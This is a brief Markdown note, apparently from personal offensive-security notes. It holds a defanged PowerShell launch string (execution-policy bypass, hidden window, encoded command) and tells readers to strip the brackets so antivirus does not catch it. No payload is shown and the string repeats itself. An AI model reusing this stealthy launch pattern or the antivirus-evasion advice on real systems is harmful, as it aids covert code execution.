
> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the brackets `[]` before executing them.
![[Pasted image 20251103011453.png]]

> [!NOTE]
> ```
> str = "powershell[.]exe -ep [bypass] -nop  -w hidden -e powershell[.]exe -nop -w hidden -e "
> ```
